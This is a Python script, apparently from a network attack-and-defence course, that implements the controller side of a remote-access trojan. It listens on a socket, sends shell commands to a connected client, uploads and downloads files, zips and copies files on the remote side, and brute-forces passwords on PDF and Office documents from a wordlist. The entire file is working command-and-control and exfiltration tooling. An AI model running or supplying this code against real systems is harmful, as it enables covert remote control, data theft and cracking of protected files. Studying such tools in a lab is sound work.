#!/usr/bin/env python
#coding:utf-8
 
import socket
import json
import struct
import os
import msoffcrypto
import PyPDF4
import optparse
from threading import Thread

def download(filedir,filename):
  dic = {'size':os.path.getsize(r'%s/%s' % (filedir,filename)),'name':filename}
  dic_b = bytes(json.dumps(dic),encoding= 'UTF-8')
  dic_b_len = len(dic_b)
  obj = struct.pack('i',dic_b_len)
  conn.send(obj)
  conn.send(dic_b)
  f = open(filename,'rb')
  for line in f:
    conn.send(line)
  else:
    print('done..')
  f.close()

def upload():
  head_len = struct.unpack("i",conn.recv(4))[0]
  get = conn.recv(head_len)
  get_json = get.decode('UTF-8')
  dic = json.loads(get_json)
  print(dic)
  filesize = dic['size']
  filename = dic['name']
  data = b''
  with open('%s/%s' % (upload_dir , filename),'wb') as f:
      recvsize = 0
      while recvsize<filesize:
          if filesize - recvsize < 1024:
              data = conn.recv(filesize - recvsize)
          else:
              data = conn.recv(1024)
          recvsize += len(data)
          f.write(data)
      else:
          f.close()
  print('done..')

def extractfile(file,passwords):
    try:
        file.load_key(password=passwords)
        print('[+] Found password '+passwords + '\n')
    except:
        pass

def extractfilepdf(pdfReader,password):
    if pdfReader.decrypt(password):
        print('[+] Found password ' + password +'\n')

def break_password(filepath,filename,filetype):
  print(filetype)
  file = os.path.join(filepath,filename)
  print(file)
  passfile = open(r'C:\Users\yangyi\Desktop\网络攻防\password1.txt')
  if filetype == 'pdf':
    f = PyPDF4.PdfFileReader(open(file,'rb'))
    for line in passfile.readlines():
      password = line.strip('\n')
      passwords=password.split( )
      for i in range(4):
        extractfilepdf(f,passwords[i])
  else:                    
    f = msoffcrypto.OfficeFile(open(file, "rb"))
    for line in passfile.readlines():
      password = line.strip('\n')
      passwords=password.split( )
      for i in range(4):
        extractfile(f,passwords[i])
    

def send(msgto):
  conn.send(msgto.encode('UTF-8'))

def recv():
  msg_get = conn.recv(1024)
  msg = msg_get.decode('UTF-8')
  print(msg)
 
HOST = "192.168.190.1"
PORT = 7777
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
addr = (HOST,PORT)
s.bind(addr)       # 绑定地址
s.listen(1)       # 打开监听
conn,addr = s.accept()  # 同意建立连接
print(addr)       # 输出客户端IP

upload_dir = r'C:\Users\yangyi\Desktop\网络攻防\上传\\'

while True:
  print('please input:')
  msgto = input()
  send(msgto)

  if msgto == 'download':
    print('please input filename:')
    filedir,filename = input().split(' ',1)
    download(filedir,filename)

  if msgto == 'upload':
    print('please input filename:')
    filedir,filename = input().split(' ',1)
    send(filedir)
    send(filename)
    upload()
  
  if msgto == 'cmd':
    print('please input cmd:')
    msgtoo = input()
    send(msgtoo)
    recv()

  if msgto == 'getfile':
    print('please input filepath:')
    filepath = input()
    send(filepath)
    print('please input filepath_new:')
    filepath_new = input()
    send(filepath_new)

  if msgto == 'zipfile':
    print('please input input_path:')
    input_path = input()
    send(input_path)
    print('please input output_path:')
    output_path = input()
    send(output_path)
    print('please input output_name:')
    output_name = input()
    send(output_name)

  if msgto == 'breakpassword':
    print('please input filepath:')
    filepath = input()
    print('please input filename:')
    filename = input()
    print('please input filetype:')
    filetype = input()
    break_password(filepath,filename,filetype)
    print('done..')
    
  if msgto == 'quit':
    break
  recv()
    
conn.close()
s.close()
